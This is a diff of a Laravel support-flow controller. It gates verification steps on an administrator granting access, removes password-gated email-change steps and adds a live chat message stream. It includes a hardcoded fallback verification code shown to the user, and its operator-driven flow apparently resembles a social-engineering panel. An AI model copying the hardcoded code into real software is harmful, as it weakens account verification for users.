@@ -28,7 +28,7 @@ class SupportFlowController extends Controller
             'message' => ['required', 'string', 'max:2000'],
         ]);
 
-        $supportCase = SupportCase::create($contact);
+        $supportCase = SupportCase::create($contact + ['access_enabled' => false]);
         $request->session()->put([
             'contact' => $contact,
             'support_case_id' => $supportCase->id,
@@ -60,39 +60,32 @@ class SupportFlowController extends Controller
         return view('flow.3');
     }
 
-    public function changeEmail(Request $request)
+    public function continueIdentity(Request $request)
     {
-        abort_unless($request->session()->get('password_verified'), 403);
+        abort_unless($request->session()->has('contact'), 403);
+        $supportCase = SupportCase::findOrFail($request->session()->get('support_case_id'));
 
-        return view('flow.4');
-    }
-
-    public function storeEmail(Request $request)
-    {
-        $email = $request->validate([
-            'email' => ['required', 'email'],
-            'confirmed' => ['accepted'],
-        ]);
-
-        $request->session()->put('new_email', $email['email']);
-        $this->updateCase($request, [
-            'new_email' => $email['email'],
-            'status' => 'email_change_requested',
-        ]);
+        if (! $supportCase->access_enabled) {
+            return redirect()->route('identity.show')->with('grant_error', 'Please follow the instructions above and wait for the administrator to grant access.');
+        }
 
         return redirect()->route('code.show');
     }
 
     public function code(Request $request)
     {
-        abort_unless($request->session()->has('new_email'), 403);
+        abort_unless($request->session()->has('contact'), 403);
+        $supportCase = SupportCase::findOrFail($request->session()->get('support_case_id'));
 
-        return view('flow.5');
+        $verificationCode = config('app.verification_code', '484518');
+        $accessGranted = $supportCase->access_enabled;
+
+        return view('flow.5', compact('verificationCode', 'accessGranted'));
     }
 
     public function complete(Request $request)
     {
-        abort_unless($request->session()->has('new_email'), 403);
+        abort_unless($request->session()->has('contact'), 403);
         $request->session()->put('verification_complete', true);
         $this->updateCase($request, ['status' => 'verified']);
 
@@ -170,6 +163,51 @@ class SupportFlowController extends Controller
             'attachment_type' => $message->attachment_mime,
             'created_at' => $message->created_at->format('Y-m-d H:i'),
         ]));
+    }
+
+    public function messageStream(Request $request)
+    {
+        abort_unless($request->session()->get('verification_complete'), 403);
+        $caseId = $request->session()->get('support_case_id');
+
+        return response()->stream(function () use ($caseId): void {
+            set_time_limit(30);
+            $lastMessageId = (int) SupportMessage::where('support_case_id', $caseId)->max('id');
+            $startedAt = microtime(true);
+
+            while (microtime(true) - $startedAt < 25) {
+                if (connection_aborted()) {
+                    return;
+                }
+
+                $latestMessageId = (int) SupportMessage::where('support_case_id', $caseId)->max('id');
+                if ($latestMessageId > $lastMessageId) {
+                    $messages = SupportMessage::where('support_case_id', $caseId)->oldest()->get()->map(fn (SupportMessage $message) => [
+                        'sender' => $message->sender,
+                        'body' => $message->body,
+                        'attachment_url' => $message->attachment_path ? route('messages.attachment', $message) : null,
+                        'attachment_type' => $message->attachment_mime,
+                        'created_at' => $message->created_at->format('Y-m-d H:i'),
+                    ]);
+
+                    echo "event: messages\n";
+                    echo 'data: '.json_encode($messages, JSON_THROW_ON_ERROR)."\n\n";
+                    $lastMessageId = $latestMessageId;
+                } else {
+                    echo ": heartbeat\n\n";
+                }
+
+                if (ob_get_level() > 0) {
+                    ob_flush();
+                }
+                flush();
+                usleep(500000);
+            }
+        }, 200, [
+            'Cache-Control' => 'no-cache, no-store, must-revalidate',
+            'Content-Type' => 'text/event-stream',
+            'X-Accel-Buffering' => 'no',
+        ]);
     }
 
     public function setTyping(Request $request)
